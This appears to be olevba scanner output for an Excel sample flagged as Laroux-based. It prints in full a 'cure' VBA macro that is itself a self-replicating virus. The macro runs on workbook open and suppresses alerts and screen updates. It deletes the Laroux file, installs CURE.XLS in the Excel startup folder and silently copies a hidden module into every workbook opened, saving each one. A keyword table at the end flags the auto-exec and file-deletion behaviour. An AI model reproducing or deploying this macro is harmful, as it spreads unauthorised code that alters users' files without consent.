olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-89282cbb623be09d778d89264817a24b03f7270f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO cure.bas 
in file: Virus.MSExcel.Laroux-based-89282cbb623be09d778d89264817a24b03f7270f - OLE stream: '_VBA_PROJECT_CUR/VBA/cure'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
      ' use Window event because LAROUX uses SheetActivate,
      ' I think if they use the same one then whomever is last
      ' takes over processing for that event.
    Application.OnWindow = "check_files"

End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.DisplayAlerts = False '** don't ask user to verify deletes or saves
    Application.ScreenUpdating = False '** don't show what the virus(macro) is doing
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")           '** check for LAROUX file
    If m$ = "PLDT.XLS" Then                   '** lets kill this one now
        Workbooks("PLDT.XLS").Close (False)   '** close it first
        Application.OnSheetActivate = ""        '** clear Laroux event handler ??
        Kill Application.StartupPath & "/" & "PLDT.XLS"  '** delete it
        MsgBox "Just killed Laroux virus for you!" & Chr(13) & Chr(10) & "       You're Welcome.....", 16
    End If
    '** new code to attempt to kill LAROUX
    '** replace "PLDT.XLS" with "CURE.XLS"
    m2$ = Dir(c$ & "\" & "CURE.XLS")      '** see if we already have the CURE
    If (m2$ = "CURE.XLS") Then p = 1 Else p = 0
    With ActiveWorkbook
       If (ActiveWorkbook.Modules.Count > 0) Then w = 1 Else w = 0
    End With
    whichfile = p + w * 10

Select Case whichfile
    Case 10            '** code to build CURE.XLS for killin XMLAROUX'
       n4$ = ActiveWorkbook.Name   '** get active workboook name
       Sheets("cure").Visible = True
       Sheets("cure").Select  '** select cure module
       Sheets("cure").Copy    '** make a copy of it in a new sheet
       With ActiveWorkbook
           .Title = ""
           .Subject = ""
           .Author = ""
           .Keywords = ""
           .Comments = ""
       End With
       newname$ = ActiveWorkbook.Name
       c4$ = CurDir()     '**  save current directory
       ChDir Application.StartupPath  '** move to startup directory
       ActiveWindow.Visible = False  '** save new workbook as CURE.XLS
       Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "CURE.XLS", FileFormat:=xlNormal _
         , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
       ChDir c4$          '** change back to original directory
       Workbooks(n4$).Sheets("cure").Visible = False
       Application.OnWindow = ""
       Application.OnWindow = "CURE.XLS!check_files"
       Workbooks(n4$).Save
       Workbooks("CURE.XLS").Saved = True
    Case 1   '** new file to infect (no virus, need the ability to infect to spread the cure)
       n4$ = ActiveWorkbook.Name
       p4$ = ActiveWorkbook.Path
       s$ = Workbooks(n4$).Sheets(1).Name  '** get name
       If s$ <> "cure" Then     '** already has the cure??
          Workbooks("CURE.XLS").Sheets("cure").Copy before:=Workbooks(n4$).Sheets(1)
          Workbooks(n4$).Sheets("cure").Visible = False
       Else
       End If
       Application.OnWindow = ""
       Application.OnWindow = "CURE.XLS!check_files"
       Workbooks(n4$).Save
       Workbooks("CURE.XLS").Saved = True
    Case 11    '** remove LAROUX virus from previously infected files
       Application.ScreenUpdating = False
       n4$ = ActiveWorkbook.Name
       p4$ = ActiveWorkbook.Path
       s$ = Workbooks(n4$).Sheets(1).Name
       If s$ = "pldt" Then  '** check for LAROUX
          Workbooks(n4$).Sheets(s$).Delete  '** delete LAROUX module
          MsgBox "Just killed Laroux virus for you!" & Chr(13) & Chr(10) & "       Your Welcome.....", 16
       End If
       If s$ <> "cure" Then  '** add the sure if its not there
          Workbooks("CURE.XLS").Sheets("cure").Copy before:=Workbooks(n4$).Sheets(1)
          Workbooks(n4$).Sheets("cure").Visible = False
       End If
       Application.OnWindow = ""
       Application.OnWindow = "CURE.XLS!check_files"
       Workbooks(n4$).Save
       Workbooks("CURE.XLS").Saved = True
    Case Else
End Select
     Application.DisplayAlerts = True  '** turn display alerts back on
     Application.ScreenUpdating = True '** show what them macros are doin
End Sub




-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  cur
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

